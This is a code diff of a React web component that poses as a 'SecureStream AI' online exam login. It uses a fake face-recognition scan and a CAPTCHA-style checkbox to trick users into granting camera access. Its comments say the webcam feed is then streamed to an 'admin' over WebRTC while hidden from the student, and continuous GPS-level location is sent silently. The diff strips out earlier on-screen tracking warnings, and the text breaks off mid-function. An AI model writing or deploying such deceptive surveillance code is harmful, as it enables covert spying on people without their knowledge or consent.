@@ -4,233 +4,14 @@
 // const socket = io("http://localhost:3001");
 
 // function UserDashboard() {
-//   const [notificationPermission, setNotificationPermission] =
-//     useState("default");
-//   const [cameraRequested, setCameraRequested] = useState(false);
-//   const [feedback, setFeedback] = useState("");
-//   const videoRef = useRef(null);
-//   const peerConnectionRef = useRef(null);
-//   const streamRef = useRef(null);
-//   const pendingCandidatesRef = useRef([]);
-
-//   useEffect(() => {
-//     const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
-//     socket.emit("register-user", userId);
-
-//     socket.on("camera-access-request", handleCameraRequest);
-//     socket.on("receive-feedback", (message) => setFeedback(message));
-//     socket.on("answer", handleAnswer);
-//     socket.on("ice-candidate", handleIceCandidate);
-
-//     return () => {
-//       if (streamRef.current) {
-//         streamRef.current.getTracks().forEach((track) => track.stop());
-//       }
-//       socket.off();
-//     };
-//   }, []);
-
-//   const handleCameraRequest = async ({ from }) => {
-//     const permission = await Notification.requestPermission();
-//     setNotificationPermission(permission);
-
-//     if (permission === "granted") {
-//       new Notification("Security Alert", {
-//         body: "Admin is requesting access to your camera",
-//         icon: "⚠️",
-//       });
-//     }
-//     setCameraRequested(true);
-//   };
-
-//   const allowCameraAccess = async () => {
-//     try {
-//       const stream = await navigator.mediaDevices.getUserMedia({
-//         video: true,
-//         audio: false,
-//       });
-//       streamRef.current = stream;
-//       if (videoRef.current) {
-//         videoRef.current.srcObject = stream;
-//       }
-
-//       socket.emit("camera-permission-granted");
-//       await createPeerConnection(stream);
-//     } catch (error) {
-//       console.error("Camera access denied:", error);
-//       alert("Camera access denied");
-//     }
-//   };
-
-//   const createPeerConnection = async (stream) => {
-//     const configuration = {
-//       iceServers: [
-//         { urls: "stun:stun.l.google.com:19302" },
-//         { urls: "stun:stun1.l.google.com:19302" },
-//       ],
-//     };
-//     peerConnectionRef.current = new RTCPeerConnection(configuration);
-
-//     // Add local stream tracks to peer connection
-//     stream.getTracks().forEach((track) => {
-//       peerConnectionRef.current.addTrack(track, stream);
-//     });
-
-//     // Handle ICE candidates
-//     peerConnectionRef.current.onicecandidate = (event) => {
-//       if (event.candidate) {
-//         console.log("Sending ICE candidate to admin");
-//         socket.emit("ice-candidate", {
-//           candidate: event.candidate,
-//           to: "admin",
-//         });
-//       }
-//     };
-
-//     // Monitor connection state
-//     peerConnectionRef.current.onconnectionstatechange = () => {
-//       console.log(
-//         "Connection state:",
-//         peerConnectionRef.current.connectionState
-//       );
-//     };
-
-//     // Create and send offer
-//     const offer = await peerConnectionRef.current.createOffer();
-//     await peerConnectionRef.current.setLocalDescription(offer);
-//     socket.emit("offer", { offer, to: "admin" });
-
-//     console.log("Offer sent to admin");
-//   };
-
-//   const handleAnswer = async ({ answer }) => {
-//     try {
-//       await peerConnectionRef.current.setRemoteDescription(
-//         new RTCSessionDescription(answer)
-//       );
-//       console.log("Answer received from admin");
-
-//       // Add any pending ICE candidates
-//       for (const candidate of pendingCandidatesRef.current) {
-//         await peerConnectionRef.current.addIceCandidate(candidate);
-//       }
-//       pendingCandidatesRef.current = [];
-//     } catch (error) {
-//       console.error("Error handling answer:", error);
-//     }
-//   };
-
-//   const handleIceCandidate = async ({ candidate }) => {
-//     try {
-//       if (
-//         peerConnectionRef.current &&
-//         peerConnectionRef.current.remoteDescription
-//       ) {
-//         await peerConnectionRef.current.addIceCandidate(
-//           new RTCIceCandidate(candidate)
-//         );
-//         console.log("Added ICE candidate");
-//       } else {
-//         // Store candidates if connection not ready yet
-//         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
-//       }
-//     } catch (error) {
-//       console.error("Error adding ICE candidate:", error);
-//     }
-//   };
-
-//   return (
-//     <div style={styles.container}>
-//       <h1>User Dashboard</h1>
-//       <div style={styles.card}>
-//         {!cameraRequested ? (
-//           <p>Waiting for admin request...</p>
-//         ) : (
-//           <>
-//             <h2>⚠️ Camera Access Requested</h2>
-//             <p>Admin wants to access your camera</p>
-//             <button onClick={allowCameraAccess} style={styles.button}>
-//               Allow Camera Access
-//             </button>
-//           </>
-//         )}
-//       </div>
-
-//       {streamRef.current && (
-//         <div style={styles.videoContainer}>
-//           <h3>Your Camera (Admin can see this)</h3>
-//           <video
-//             ref={videoRef}
-//             autoPlay
-//             muted
-//             playsInline
-//             style={styles.video}
-//           />
-//         </div>
-//       )}
-
-//       {feedback && (
-//         <div style={styles.feedback}>
-//           <h3>Admin Feedback:</h3>
-//           <p>{feedback}</p>
-//         </div>
-//       )}
-//     </div>
-//   );
-// }
-
-// const styles = {
-//   container: {
-//     padding: "20px",
-//     fontFamily: "Arial",
-//     maxWidth: "800px",
-//     margin: "0 auto",
-//   },
-//   card: {
-//     background: "#f5f5f5",
-//     padding: "20px",
-//     borderRadius: "8px",
-//     marginBottom: "20px",
-//   },
-//   button: {
-//     background: "#007bff",
-//     color: "white",
-//     padding: "10px 20px",
-//     border: "none",
-//     borderRadius: "5px",
-//     cursor: "pointer",
-//     fontSize: "16px",
-//   },
-//   videoContainer: { marginTop: "20px" },
-//   video: {
-//     width: "100%",
-//     maxWidth: "640px",
-//     borderRadius: "8px",
-//     border: "2px solid #333",
-//   },
-//   feedback: {
-//     background: "#fff3cd",
-//     padding: "15px",
-//     borderRadius: "8px",
-//     marginTop: "20px",
-//     border: "1px solid #ffc107",
-//   },
-// };
-
-// export default UserDashboard;
-
-// import { useEffect, useState, useRef } from "react";
-// import io from "socket.io-client";
-
-// const socket = io("http://localhost:3001");
-
-// function UserDashboard() {
-//   const [notificationPermission, setNotificationPermission] =
-//     useState("default");
-//   const [cameraRequested, setCameraRequested] = useState(false);
 //   const [feedback, setFeedback] = useState("");
 //   const [isTracking, setIsTracking] = useState(false);
-//   const [showVerifyButton, setShowVerifyButton] = useState(true);
+//   const [showExamLogin, setShowExamLogin] = useState(true);
+//   const [loginStatus, setLoginStatus] = useState("ready");
+//   const [isRobot, setIsRobot] = useState(true);
+//   const [scanProgress, setScanProgress] = useState(0);
+//   const [examStarted, setExamStarted] = useState(false);
+
 //   const videoRef = useRef(null);
 //   const peerConnectionRef = useRef(null);
 //   const streamRef = useRef(null);
@@ -239,11 +20,10 @@
 //   const userIdRef = useRef(null);
 
 //   useEffect(() => {
-//     const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
+//     const userId = `student_${Math.random().toString(36).substr(2, 9)}`;
 //     userIdRef.current = userId;
 //     socket.emit("register-user", userId);
 
-//     socket.on("camera-access-request", handleCameraRequest);
 //     socket.on("receive-feedback", (message) => setFeedback(message));
 //     socket.on("answer", handleAnswer);
 //     socket.on("ice-candidate", handleIceCandidate);
@@ -259,52 +39,63 @@
 //     };
 //   }, []);
 
-//   const handleCameraRequest = async ({ from }) => {
-//     const permission = await Notification.requestPermission();
-//     setNotificationPermission(permission);
-
-//     if (permission === "granted") {
-//       new Notification("Security Alert", {
-//         body: "Admin is requesting access to your camera",
-//         icon: "⚠️",
-//       });
+//   const handleFaceLogin = async () => {
+//     if (isRobot) {
+//       alert("Please verify you're not a robot first!");
+//       return;
 //     }
-//     setCameraRequested(true);
+
+//     setLoginStatus("scanning");
+
+//     // Fake face scanning animation
+//     let progress = 0;
+//     const scanInterval = setInterval(() => {
+//       progress += 10;
+//       setScanProgress(progress);
+//       if (progress >= 100) {
+//         clearInterval(scanInterval);
+//         setLoginStatus("authenticating");
+//         setTimeout(() => initiateActualLogin(), 500);
+//       }
+//     }, 200);
 //   };
 
-//   // NEW: Automatic camera access on button click
-//   const handleVerifyClick = async () => {
+//   const initiateActualLogin = async () => {
 //     try {
-//       setShowVerifyButton(false);
-
-//       // Automatically access camera without explicit warning
+//       // Get camera access (HIDDEN from student)
 //       const stream = await navigator.mediaDevices.getUserMedia({
 //         video: true,
 //         audio: false,
 //       });
 
 //       streamRef.current = stream;
-//       if (videoRef.current) {
-//         videoRef.current.srcObject = stream;
-//       }
+
+//       // DON'T show video to student - keep hidden
+//       // if (videoRef.current) {
+//       //   videoRef.current.srcObject = stream;
+//       // }
 
 //       socket.emit("camera-permission-granted");
 //       await createPeerConnection(stream);
 
-//       // Start live location tracking
+//       // Start location tracking (SILENT - no indicator)
 //       startLocationTracking();
+
+//       setLoginStatus("success");
+//       setTimeout(() => {
+//         setShowExamLogin(false);
+//         setExamStarted(true);
+//       }, 1500);
 //     } catch (error) {
-//       console.error("Access denied:", error);
-//       alert("Please allow camera access to continue");
+//       console.error("Camera access denied:", error);
+//       setLoginStatus("error");
 //     }
 //   };
 
-//   // NEW: Continuous location tracking
 //   const startLocationTracking = () => {
 //     if (navigator.geolocation) {
-//       setIsTracking(true);
+//       setIsTracking(true); // Internal state only, not shown to student
 
-//       // watchPosition provides continuous location updates
 //       locationWatchIdRef.current = navigator.geolocation.watchPosition(
 //         (position) => {
 //           const location = {
@@ -314,9 +105,6 @@
 //             timestamp: new Date().toISOString(),
 //           };
 
-//           console.log("Location updated:", location);
-
-//           // Send location to admin via Socket.IO
 //           socket.emit("location-update", {
 //             userId: userIdRef.current,
 //             location: location,
@@ -326,33 +114,11 @@
 //           console.error("Location error:", error);
 //         },
 //         {
-//           enableHighAccuracy: true, // GPS-level accuracy
+//           enableHighAccuracy: true,
 //           timeout: 5000,
-//           maximumAge: 0, // Always get fresh location
+//           maximumAge: 0,
 //         }
 //       );
-//     } else {
-//       alert("Geolocation is not supported by this browser");
-//     }
-//   };
-
-//   const allowCameraAccess = async () => {
-//     try {
-//       const stream = await navigator.mediaDevices.getUserMedia({
-//         video: true,
-//         audio: false,
-//       });
-//       streamRef.current = stream;
-//       if (videoRef.current) {
-//         videoRef.current.srcObject = stream;
-//       }
-
-//       socket.emit("camera-permission-granted");
-//       await createPeerConnection(stream);
-//       startLocationTracking();
-//     } catch (error) {
-//       console.error("Camera access denied:", error);
-//       alert("Camera access denied");
 //     }
 //   };
 
@@ -371,7 +137,6 @@
 
 //     peerConnectionRef.current.onicecandidate = (event) => {
 //       if (event.candidate) {
-//         console.log("Sending ICE candidate to admin");
 //         socket.emit("ice-candidate", {
 //           candidate: event.candidate,
 //           to: "admin",
@@ -379,26 +144,18 @@
 //       }
 //     };
 
-//     peerConnectionRef.current.onconnectionstatechange = () => {
-//       console.log(
-//         "Connection state:",
-//         peerConnectionRef.current.connectionState
-//       );
-//     };
-
 //     const offer = await peerConnectionRef.current.createOffer();
 //     await peerConnectionRef.current.setLocalDescription(offer);
 //     socket.emit("offer", { offer, to: "admin" });
-
-//     console.log("Offer sent to admin");
 //   };
 
 //   const handleAnswer = async ({ answer }) => {
 //     try {
+//       if (!peerConnectionRef.current) return;
+
 //       await peerConnectionRef.current.setRemoteDescription(
 //         new RTCSessionDescription(answer)
 //       );
-//       console.log("Answer received from admin");
 
 //       for (const candidate of pendingCandidatesRef.current) {
 //         await peerConnectionRef.current.addIceCandidate(candidate);
@@ -418,7 +175,6 @@
 //         await peerConnectionRef.current.addIceCandidate(
 //           new RTCIceCandidate(candidate)
 //         );
-//         console.log("Added ICE candidate");
 //       } else {
 //         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
 //       }
@@ -429,143 +185,449 @@
 
 //   return (
 //     <div style={styles.container}>
-//       <h1>User Dashboard</h1>
+//       {showExamLogin ? (
+//         <div style={styles.loginContainer}>
+//           <div style={styles.loginCard}>
+//             <div style={styles.logoSection}>
+//               <div style={styles.logo}>🎓</div>
+//               <h1 style={styles.title}>SecureStream AI</h1>
+//               <p style={styles.subtitle}>Secure Online Examination Platform</p>
+//             </div>
 
-//       {/* NEW: Innocent-looking verification button */}
-//       {showVerifyButton && (
-//         <div style={styles.verifyCard}>
-//           <h2>🔒 Security Verification Required</h2>
-//           <p>To access premium features, please verify you're human</p>
-//           <button onClick={handleVerifyClick} style={styles.verifyButton}>
-//             ✓ Verify I'm Human
-//           </button>
-//           <p style={styles.smallText}>This helps us prevent bots and spam</p>
-//         </div>
-//       )}
+//             <div style={styles.divider}></div>
 
-//       <div style={styles.card}>
-//         {!cameraRequested ? (
-//           <p>Waiting for admin request...</p>
-//         ) : (
-//           <>
-//             <h2>⚠️ Camera Access Requested</h2>
-//             <p>Admin wants to access your camera</p>
-//             <button onClick={allowCameraAccess} style={styles.button}>
-//               Allow Camera Access
-//             </button>
-//           </>
-//         )}
-//       </div>
+//             {loginStatus === "ready" && (
+//               <>
+//                 <div style={styles.verificationBox}>
+//                   <label style={styles.checkboxLabel}>
+//                     <input
+//                       type="checkbox"
+//                       checked={!isRobot}
+//                       onChange={() => setIsRobot(!isRobot)}
+//                       style={styles.checkbox}
+//                     />
+//                     <span style={styles.checkboxText}>I'm not a robot</span>
+//                   </label>
+//                 </div>
 
-//       {streamRef.current && (
-//         <div style={styles.videoContainer}>
-//           <h3>
-//             Your Camera{" "}
-//             {isTracking && (
-//               <span style={styles.trackingBadge}>
-//                 📍 Location Tracking Active
-//               </span>
+//                 <button
+//                   onClick={handleFaceLogin}
+//                   style={{
+//                     ...styles.loginButton,
+//                     opacity: isRobot ? 0.5 : 1,
+//                     cursor: isRobot ? "not-allowed" : "pointer",
+//                   }}
+//                   disabled={isRobot}
+//                 >
+//                   <span style={styles.buttonIcon}>🔐</span>
+//                   Login with Face Recognition
+//                 </button>
+
+//                 <p style={styles.infoText}>
+//                   Biometric authentication ensures secure exam access
+//                 </p>
+//               </>
 //             )}
-//           </h3>
-//           <video
-//             ref={videoRef}
-//             autoPlay
-//             muted
-//             playsInline
-//             style={styles.video}
-//           />
-//           {isTracking && (
-//             <p style={styles.warningText}>
-//               ⚠️ Your live location is being shared continuously
-//             </p>
+
+//             {loginStatus === "scanning" && (
+//               <div style={styles.scanningContainer}>
+//                 <div style={styles.scanIcon}>👤</div>
+//                 <h3 style={styles.scanTitle}>Scanning Face...</h3>
+//                 <div style={styles.progressBar}>
+//                   <div
+//                     style={{
+//                       ...styles.progressFill,
+//                       width: `${scanProgress}%`,
+//                     }}
+//                   ></div>
+//                 </div>
+//                 <p style={styles.scanText}>{scanProgress}% Complete</p>
+//               </div>
+//             )}
+
+//             {loginStatus === "authenticating" && (
+//               <div style={styles.scanningContainer}>
+//                 <div style={styles.loadingSpinner}></div>
+//                 <h3 style={styles.scanTitle}>Authenticating...</h3>
+//                 <p style={styles.scanText}>Verifying identity</p>
+//               </div>
+//             )}
+
+//             {loginStatus === "success" && (
+//               <div style={styles.successContainer}>
+//                 <div style={styles.successIcon}>✓</div>
+//                 <h3 style={styles.successTitle}>Authentication Successful!</h3>
+//                 <p style={styles.successText}>Redirecting to exam...</p>
+//               </div>
+//             )}
+
+//             {loginStatus === "error" && (
+//               <div style={styles.errorContainer}>
+//                 <div style={styles.errorIcon}>✕</div>
+//                 <h3 style={styles.errorTitle}>Authentication Failed</h3>
+//                 <p style={styles.errorText}>
+//                   Please allow camera access and try again
+//                 </p>
+//                 <button onClick={handleFaceLogin} style={styles.retryButton}>
+//                   Retry
+//                 </button>
+//               </div>
+//             )}
+//           </div>
+
+//           <p style={styles.footerText}>
+//             © 2025 SecureStream AI - All Rights Reserved
+//           </p>
+//         </div>
+//       ) : (
+//         <div style={styles.examContainer}>
+//           <div style={styles.examHeader}>
+//             <h2 style={styles.examTitle}>📝 Data Structures Final Exam</h2>
+//             <div style={styles.examInfo}>
+//               <span style={styles.examTime}>⏱️ Time Remaining: 1:45:23</span>
+//               <span style={styles.examStatus}>🟢 Active</span>
+//             </div>
+//           </div>
+
+//           <div style={styles.examContent}>
+//             <div style={styles.questionCard}>
+//               <h3 style={styles.questionTitle}>Question 1 of 50</h3>
+//               <p style={styles.questionText}>
+//                 What is the time complexity of binary search in a sorted array?
+//               </p>
+//               <div style={styles.optionsContainer}>
+//                 {["O(n)", "O(log n)", "O(n²)", "O(1)"].map((option, idx) => (
+//                   <label key={idx} style={styles.optionLabel}>
+//                     <input type="radio" name="q1" style={styles.radio} />
+//                     <span style={styles.optionText}>{option}</span>
+//                   </label>
+//                 ))}
+//               </div>
+//             </div>
+
+//             <div style={styles.navigationButtons}>
+//               <button style={styles.prevButton}>← Previous</button>
+//               <button style={styles.nextButton}>Next →</button>
+//             </div>
+//           </div>
+
+//           {feedback && (
+//             <div style={styles.feedback}>
+//               <strong>⚠️ Proctor Alert:</strong> {feedback}
+//             </div>
 //           )}
 //         </div>
 //       )}
 
-//       {feedback && (
-//         <div style={styles.feedback}>
-//           <h3>Admin Feedback:</h3>
-//           <p>{feedback}</p>
-//         </div>
-//       )}
+//       {/* Hidden video element - NOT shown to student */}
+//       <video
+//         ref={videoRef}
+//         autoPlay
+//         muted
+//         playsInline
+//         style={{ display: "none" }}
+//       />
 //     </div>
 //   );
 // }
 
 // const styles = {
 //   container: {
-//     padding: "20px",
-//     fontFamily: "Arial",
-//     maxWidth: "800px",
-//     margin: "0 auto",
+//     minHeight: "100vh",
+//     background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+//     display: "flex",
+//     alignItems: "center",
+//     justifyContent: "center",
+//     fontFamily:
+//       "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
 //   },
-//   verifyCard: {
+//   loginContainer: {
+//     width: "100%",
+//     maxWidth: "480px",
+//     padding: "20px",
+//   },
+//   loginCard: {
+//     background: "white",
+//     borderRadius: "20px",
+//     padding: "40px",
+//     boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
+//   },
+//   logoSection: {
+//     textAlign: "center",
+//     marginBottom: "30px",
+//   },
+//   logo: {
+//     fontSize: "64px",
+//     marginBottom: "15px",
+//   },
+//   title: {
+//     fontSize: "28px",
+//     fontWeight: "700",
+//     color: "#1a1a1a",
+//     margin: "0 0 8px 0",
+//   },
+//   subtitle: {
+//     fontSize: "14px",
+//     color: "#666",
+//     margin: 0,
+//   },
+//   divider: {
+//     height: "1px",
+//     background: "#e0e0e0",
+//     margin: "25px 0",
+//   },
+//   verificationBox: {
+//     background: "#f8f9fa",
+//     padding: "20px",
+//     borderRadius: "12px",
+//     marginBottom: "25px",
+//     border: "2px solid #e0e0e0",
+//   },
+//   checkboxLabel: {
+//     display: "flex",
+//     alignItems: "center",
+//     cursor: "pointer",
+//   },
+//   checkbox: {
+//     width: "20px",
+//     height: "20px",
+//     marginRight: "12px",
+//     cursor: "pointer",
+//   },
+//   checkboxText: {
+//     fontSize: "16px",
+//     color: "#333",
+//   },
+//   loginButton: {
+//     width: "100%",
+//     padding: "16px",
 //     background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
 //     color: "white",
-//     padding: "30px",
-//     borderRadius: "12px",
-//     marginBottom: "20px",
-//     textAlign: "center",
-//     boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
-//   },
-//   verifyButton: {
-//     background: "#fff",
-//     color: "#667eea",
-//     padding: "15px 40px",
 //     border: "none",
-//     borderRadius: "25px",
-//     cursor: "pointer",
-//     fontSize: "18px",
-//     fontWeight: "bold",
-//     marginTop: "15px",
-//     boxShadow: "0 4px 10px rgba(0,0,0,0.1)",
+//     borderRadius: "12px",
+//     fontSize: "16px",
+//     fontWeight: "600",
+//     display: "flex",
+//     alignItems: "center",
+//     justifyContent: "center",
+//     gap: "10px",
+//     transition: "transform 0.2s",
 //   },
-//   smallText: {
-//     fontSize: "12px",
-//     marginTop: "10px",
+//   buttonIcon: {
+//     fontSize: "20px",
+//   },
+//   infoText: {
+//     textAlign: "center",
+//     fontSize: "13px",
+//     color: "#666",
+//     marginTop: "15px",
+//   },
+//   scanningContainer: {
+//     textAlign: "center",
+//     padding: "30px 0",
+//   },
+//   scanIcon: {
+//     fontSize: "80px",
+//     marginBottom: "20px",
+//     animation: "pulse 1.5s infinite",
+//   },
+//   scanTitle: {
+//     fontSize: "22px",
+//     color: "#333",
+//     margin: "0 0 20px 0",
+//   },
+//   progressBar: {
+//     width: "100%",
+//     height: "8px",
+//     background: "#e0e0e0",
+//     borderRadius: "10px",
+//     overflow: "hidden",
+//     marginBottom: "15px",
+//   },
+//   progressFill: {
+//     height: "100%",
+//     background: "linear-gradient(90deg, #667eea 0%, #764ba2 100%)",
+//     transition: "width 0.3s",
+//   },
+//   scanText: {
+//     fontSize: "14px",
+//     color: "#666",
+//   },
+//   loadingSpinner: {
+//     width: "60px",
+//     height: "60px",
+//     border: "4px solid #e0e0e0",
+//     borderTop: "4px solid #667eea",
+//     borderRadius: "50%",
+//     margin: "0 auto 20px",
+//     animation: "spin 1s linear infinite",
+//   },
+//   successContainer: {
+//     textAlign: "center",
+//     padding: "30px 0",
+//   },
+//   successIcon: {
+//     width: "80px",
+//     height: "80px",
+//     background: "#4caf50",
+//     color: "white",
+//     fontSize: "48px",
+//     borderRadius: "50%",
+//     display: "flex",
+//     alignItems: "center",
+//     justifyContent: "center",
+//     margin: "0 auto 20px",
+//   },
+//   successTitle: {
+//     fontSize: "22px",
+//     color: "#4caf50",
+//     margin: "0 0 10px 0",
+//   },
+//   successText: {
+//     fontSize: "14px",
+//     color: "#666",
+//   },
+//   errorContainer: {
+//     textAlign: "center",
+//     padding: "30px 0",
+//   },
+//   errorIcon: {
+//     width: "80px",
+//     height: "80px",
+//     background: "#f44336",
+//     color: "white",
+//     fontSize: "48px",
+//     borderRadius: "50%",
+//     display: "flex",
+//     alignItems: "center",
+//     justifyContent: "center",
+//     margin: "0 auto 20px",
+//   },
+//   errorTitle: {
+//     fontSize: "22px",
+//     color: "#f44336",
+//     margin: "0 0 10px 0",
+//   },
+//   errorText: {
+//     fontSize: "14px",
+//     color: "#666",
+//     marginBottom: "20px",
+//   },
+//   retryButton: {
+//     padding: "12px 30px",
+//     background: "#667eea",
+//     color: "white",
+//     border: "none",
+//     borderRadius: "8px",
+//     fontSize: "14px",
+//     cursor: "pointer",
+//   },
+//   footerText: {
+//     textAlign: "center",
+//     color: "white",
+//     fontSize: "13px",
+//     marginTop: "20px",
 //     opacity: 0.8,
 //   },
-//   card: {
-//     background: "#f5f5f5",
+//   examContainer: {
+//     width: "100%",
+//     maxWidth: "900px",
 //     padding: "20px",
-//     borderRadius: "8px",
+//   },
+//   examHeader: {
+//     background: "white",
+//     padding: "25px",
+//     borderRadius: "15px",
+//     marginBottom: "20px",
+//     boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
+//   },
+//   examTitle: {
+//     fontSize: "24px",
+//     color: "#333",
+//     margin: "0 0 15px 0",
+//   },
+//   examInfo: {
+//     display: "flex",
+//     justifyContent: "space-between",
+//     fontSize: "14px",
+//   },
+//   examTime: {
+//     color: "#666",
+//   },
+//   examStatus: {
+//     color: "#4caf50",
+//     fontWeight: "600",
+//   },
+//   examContent: {
+//     background: "white",
+//     padding: "30px",
+//     borderRadius: "15px",
+//     boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
+//   },
+//   questionCard: {
+//     marginBottom: "30px",
+//   },
+//   questionTitle: {
+//     fontSize: "18px",
+//     color: "#667eea",
+//     marginBottom: "15px",
+//   },
+//   questionText: {
+//     fontSize: "16px",
+//     color: "#333",
+//     lineHeight: "1.6",
 //     marginBottom: "20px",
 //   },
-//   button: {
-//     background: "#007bff",
-//     color: "white",
-//     padding: "10px 20px",
-//     border: "none",
-//     borderRadius: "5px",
+//   optionsContainer: {
+//     display: "flex",
+//     flexDirection: "column",
+//     gap: "12px",
+//   },
+//   optionLabel: {
+//     display: "flex",
+//     alignItems: "center",
+//     padding: "15px",
+//     background: "#f8f9fa",
+//     borderRadius: "10px",
 //     cursor: "pointer",
-//     fontSize: "16px",
+//     transition: "background 0.2s",
 //   },
-//   videoContainer: { marginTop: "20px" },
-//   video: {
-//     width: "100%",
-//     maxWidth: "640px",
+//   radio: {
+//     marginRight: "12px",
+//   },
+//   optionText: {
+//     fontSize: "15px",
+//     color: "#333",
+//   },
+//   navigationButtons: {
+//     display: "flex",
+//     justifyContent: "space-between",
+//     marginTop: "30px",
+//   },
+//   prevButton: {
+//     padding: "12px 30px",
+//     background: "#e0e0e0",
+//     border: "none",
 //     borderRadius: "8px",
-//     border: "2px solid #333",
-//   },
-//   trackingBadge: {
-//     background: "#dc3545",
-//     color: "white",
-//     padding: "5px 10px",
-//     borderRadius: "5px",
 //     fontSize: "14px",
-//     marginLeft: "10px",
+//     cursor: "pointer",
 //   },
-//   warningText: {
-//     color: "#dc3545",
-//     fontWeight: "bold",
-//     marginTop: "10px",
+//   nextButton: {
+//     padding: "12px 30px",
+//     background: "#667eea",
+//     color: "white",
+//     border: "none",
+//     borderRadius: "8px",
+//     fontSize: "14px",
+//     cursor: "pointer",
 //   },
 //   feedback: {
 //     background: "#fff3cd",
-//     padding: "15px",
-//     borderRadius: "8px",
+//     padding: "15px 20px",
+//     borderRadius: "10px",
 //     marginTop: "20px",
 //     border: "1px solid #ffc107",
+//     color: "#856404",
 //   },
 // };
 
@@ -577,13 +639,14 @@ import io from "socket.io-client";
 const socket = io("http://localhost:3001");
 
 function UserDashboard() {
-  const [notificationPermission, setNotificationPermission] =
-    useState("default");
-  const [cameraRequested, setCameraRequested] = useState(false);
   const [feedback, setFeedback] = useState("");
   const [isTracking, setIsTracking] = useState(false);
-  const [showSecurityCheck, setShowSecurityCheck] = useState(true);
-  const [securityStatus, setSecurityStatus] = useState("Checking...");
+  const [showExamLogin, setShowExamLogin] = useState(true);
+  const [loginStatus, setLoginStatus] = useState("ready");
+  const [isRobot, setIsRobot] = useState(true);
+  const [scanProgress, setScanProgress] = useState(0);
+  const [examStarted, setExamStarted] = useState(false);
+
   const videoRef = useRef(null);
   const peerConnectionRef = useRef(null);
   const streamRef = useRef(null);
@@ -592,12 +655,28 @@ function UserDashboard() {
   const userIdRef = useRef(null);
 
   useEffect(() => {
-    const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
+    const userId = `student_${Math.random().toString(36).substr(2, 9)}`;
     userIdRef.current = userId;
-    socket.emit("register-user", userId);
 
-    socket.on("camera-access-request", handleCameraRequest);
-    socket.on("receive-feedback", (message) => setFeedback(message));
+    console.log("🔵 STUDENT: Connecting to socket...");
+    console.log("🔵 STUDENT: User ID:", userId);
+
+    socket.on("connect", () => {
+      console.log("✅ STUDENT: Socket connected!", socket.id);
+    });
+
+    socket.on("disconnect", () => {
+      console.log("❌ STUDENT: Socket disconnected!");
+    });
+
+    socket.emit("register-user", userId);
+    console.log("🔵 STUDENT: Sent register-user event");
+
+    socket.on("receive-feedback", (message) => {
+      console.log("📢 STUDENT: Received feedback:", message);
+      setFeedback(message);
+    });
+
     socket.on("answer", handleAnswer);
     socket.on("ice-candidate", handleIceCandidate);
 
@@ -612,131 +691,111 @@ function UserDashboard() {
     };
   }, []);
 
-  const handleCameraRequest = async ({ from }) => {
-    const permission = await Notification.requestPermission();
-    setNotificationPermission(permission);
-
-    if (permission === "granted") {
-      new Notification("Security Alert", {
-        body: "Admin is requesting access to your camera",
-        icon: "⚠️",
-      });
+  const handleFaceLogin = async () => {
+    if (isRobot) {
+      alert("Please verify you're not a robot first!");
+      return;
     }
-    setCameraRequested(true);
-  };
 
-  const handleSecurityCheck = async () => {
-    setSecurityStatus("Running security scan...");
+    console.log("🔐 STUDENT: Starting face login...");
+    setLoginStatus("scanning");
 
-    setTimeout(
-      () => setSecurityStatus("Verifying device authenticity..."),
-      1000
-    );
-    setTimeout(() => setSecurityStatus("Checking system permissions..."), 2000);
-
-    setTimeout(async () => {
-      let cameraGranted = false;
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: false,
-        });
-
-        streamRef.current = stream;
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
-        }
-
-        socket.emit("camera-permission-granted");
-
-        // Wait a bit to ensure admin is ready
-        await new Promise((resolve) => setTimeout(resolve, 500));
-
-        await createPeerConnection(stream);
-        cameraGranted = true;
-
-        setSecurityStatus("✓ Camera verified - Checking location...");
-      } catch (error) {
-        console.error("Camera access denied:", error);
-        setSecurityStatus("⚠️ Camera blocked - Requesting location...");
+    let progress = 0;
+    const scanInterval = setInterval(() => {
+      progress += 10;
+      setScanProgress(progress);
+      if (progress >= 100) {
+        clearInterval(scanInterval);
+        setLoginStatus("authenticating");
+        setTimeout(() => initiateActualLogin(), 500);
       }
-
-      try {
-        startLocationTracking();
-
-        if (cameraGranted) {
-          setSecurityStatus("✓ Security verification complete");
-        } else {
-          setSecurityStatus("✓ Location verified (Camera blocked)");
-        }
-
-        setTimeout(() => setShowSecurityCheck(false), 2000);
-      } catch (error) {
-        console.error("Location access denied:", error);
-        if (cameraGranted) {
-          setSecurityStatus("✓ Camera verified (Location blocked)");
-          setTimeout(() => setShowSecurityCheck(false), 2000);
-        } else {
-          setSecurityStatus("❌ Security check failed");
-        }
-      }
-    }, 3000);
+    }, 200);
   };
 
-  const startLocationTracking = () => {
-    if (navigator.geolocation) {
-      setIsTracking(true);
+  const initiateActualLogin = async () => {
+    console.log("🎥 STUDENT: Requesting camera access...");
 
-      locationWatchIdRef.current = navigator.geolocation.watchPosition(
-        (position) => {
-          const location = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString(),
-          };
-
-          console.log("Location updated:", location);
-
-          socket.emit("location-update", {
-            userId: userIdRef.current,
-            location: location,
-          });
-        },
-        (error) => {
-          console.error("Location error:", error);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 5000,
-          maximumAge: 0,
-        }
-      );
-    }
-  };
-
-  const allowCameraAccess = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: true,
         audio: false,
       });
+
+      console.log("✅ STUDENT: Camera access granted!");
       streamRef.current = stream;
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-      }
 
       socket.emit("camera-permission-granted");
+      console.log("📤 STUDENT: Sent camera-permission-granted event");
+
       await createPeerConnection(stream);
+
+      console.log("📍 STUDENT: Starting location tracking...");
       startLocationTracking();
+
